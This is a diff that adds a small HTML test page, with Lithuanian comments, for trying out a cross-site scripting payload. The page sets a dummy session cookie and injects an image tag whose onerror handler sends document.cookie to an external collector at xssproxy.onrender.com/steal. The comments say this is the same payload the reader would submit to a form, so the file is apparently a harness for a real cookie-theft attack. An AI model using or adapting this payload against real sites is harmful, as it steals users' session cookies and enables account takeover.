@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Testinis XSS</h1>
+  <div id="test"></div>
+  <script>
+    // Imituojame, kad jau turime kažkokį slapuką (testavimui)
+    document.cookie = "session=abc123; test=456";
+
+    // Įklijuojame tavo payload (tą patį, kurį siųstum į anketą)
+    document.getElementById('test').innerHTML = '<img src=x onerror="this.onerror=null;this.src=\'https://xssproxy.onrender.com/steal?c=\'+encodeURIComponent(document.cookie)">';
+  </script>
+</body>
+</html>
